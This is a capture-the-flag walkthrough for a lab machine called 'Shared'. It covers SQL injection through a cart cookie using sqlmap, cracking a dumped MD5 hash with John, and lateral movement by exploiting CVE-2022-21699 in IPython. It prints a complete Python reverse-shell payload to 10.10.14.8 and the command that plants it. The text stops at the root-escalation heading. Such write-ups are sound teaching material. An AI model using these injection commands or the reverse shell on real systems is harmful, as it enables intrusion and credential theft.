___
## Skills Covered

- Web Enumeration
- Basic Decompliation
- SQL Injection
___
## Tools used

- Ghidra
- NMAP
- sqlmap
- John
- pspy

___
## Enumeration

As always, start by running an NMAP scan of the server. The scan shows that Port 80 is serving a web server with the host name `http://shared.htb`. The scan also shows that Port 443 is serving the web server with HTTPS. The `commonName` part of the scan also suggests that the server is using a wildcard certificate, likely indicating that there are subdomains.

Attempting to connect to the web server on port 80 via the IP redirects automatically to `http://shared.htb`, so it is necessary to reflect this in `/etc/hosts`

Visiting the web page immediately presents 2 notifications. One about downtime caused by a full hard drive and the other explaining that there is a new checkout system. In CTF boxes, these notifications are usually a hint of the correct path, so it would be a good first step to begin enumerating the checkout system.

Discovered from experimenting with the page, the checkout system creates a new cookie when a product is added to the cart:

```
Set-Cookie custom_cart=%7B%22CRAAFTKP%22%3A%222%22%7D; expires=Mon, 31-Oct-2022
21:00:40 GMT; Max-Age=86400; path=/; domain=.shared.htb; secure; SameSite=None
```

When clicking 'Proceed to checkout', the application redirects to a new subdomain `checkout.shared.htb`. To enable correct functionality of the application and allow for further enumeration, add the domain to the `/etc/hosts` file.

Investigating the cookie further, the `custom_cart` variable is URL encoded. When decoded it takes the form `{ "Product_Code"} : { "quantity" }`. It is reasonable to assume that a database containing product information is running on the server, and that the web app is running an SQL query to translate the product code into description, prices, etc. Because of this, the best avenue to explore next is SQLi.

Attempting to use the value `{"CRAAFTKP'#":"1"}` for `custom_cart` returns the details for the `CRAAFTKP` product successfully, whilst using a different character such as a quote (`{"CRAFFTKP'":"1"}`) returns a `Not Found` product. This suggests that the application is vulnerable to an SQLi attack, because adding an illegal character `'` causes an error, whereas terminating the value with the SQL comment character `#` displays the correct product. This makes it highly likely that the application is parsing injected SQL code.

Now that the possible SQLi vulnerability has discovered, use `sqlmap` to exploit it and dump the databases:

```
sqlmap -u "https://checkout.shared.htb/" --cookie='custom_cart={"*":"1"}' --flush --fresh-queries --level=3 --risk=3 --dbs
```

SQLMap outputs that, alongside the default database, there is a database called checkouts. Dump the tables in this database using the following command:

```
sqlmap -u "https://checkout.shared.htb/" --cookie='custom_cart={"*":"1"}' --flush --fresh-queries --level=3 --risk=3 -D checkout --tables
```

Within the database there is an interesting table called `user`. Dump this table using the following command:

```
sqlmap -u "https://checkout.shared.htb/" --cookie='custom_cart={"*":"1"}' --flush --fresh-queries --level=3 --risk=3 -D checkout -T user --dump
```

This table contains a username and a hash that looks like MD5. This can be verified using `hashid [hash]`

Save the hash into a file with a name such as `james_mason.hash`. The hash can then be cracked using `john`.

```
john --wordlist=/usr/share/wordlists/rockyou.txt james_mason.hash --format=RAW-MD5
```

John outputs that the value of the hash is `Soleil101`. Now that credentials are gathered, attempt to SSH in using `james_mason` as the username, and the freshly cracked password.

Once SSH'd in, `ls` in the home folder of `james_mason` shows no interesting files. Looking at other visible home folders, there is a user `dan_smith`. In this users home folder there is the `user.txt` flag, but it is inaccessible.

## Lateral movement to `dan_smith` user

Running the `id` command shows that the `james_mason` user is part of the developer group:

```
uid=1000(james_mason) gid=1000(james_mason) groups=1000(james_mason),1001(developer)
```

Running `cat /etc/group | grep developer` shows that `dan_smith` is also part of this group.
Host a Python HTTP server with the `pspy` tool. This tool will show which processes other users are running.

Download the `pspy` tool from the HTTP server using `wget`.

After a few seconds, `pspy` shows that `UID=1001` is running a script in the `/opt/scripts_review/` folder. `UID=1001` is the User ID for `dan_smith`. 

```
CMD: UID=1001 PID=35307  | /bin/sh -c /usr/bin/pkill ipython; cd /opt/scripts_review/ && /usr/local/bin/ipython 
```

The script seems to be running `IPython`, which is a type of command shell. Check the version of IPython by running `ipython --version`. This command outputs that the running IPython version is `8.0.0`. A quick google search suggests that this version of the application is vulnerable to `CVE-2022-21699`.

Exploiting this vulnerability is extremely simple, and the [GitHub advisory](https://github.com/advisories/GHSA-pq7m-3gw7-gq5x) explains how this exploit works very well. Run the following command to gain a shell as `dan_smith`.

The following Python code serves as the payload of the exploit:

```
import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(("10.10.14.8",8012)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);
os.dup2(s.fileno(),2); import pty; pty.spawn("sh")
```

Start a `nc` listener to catch this shell.

In order to get IPython to actually run this payload, create the necessary directories and files using a bash command:

```
mkdir -m 777 /opt/scripts_review/profile_default && mkdir -m 777 /opt/scripts_review/profile_default/startup && echo 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("10.10.14.8",8012)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); import pty; pty.spawn("sh")' > /opt/scripts_review/profile_default/startup/test123.py
```

A few seconds after running this command, `nc` will receive a reverse shell as `dan_smith`. Retrieve the user flag from the home directory. There is also an SSH private key that can be used for a full SSH connection as `dan_smith` using `ssh -i /path/to/key dan_smith@shared.htb`

## Escalating to root.

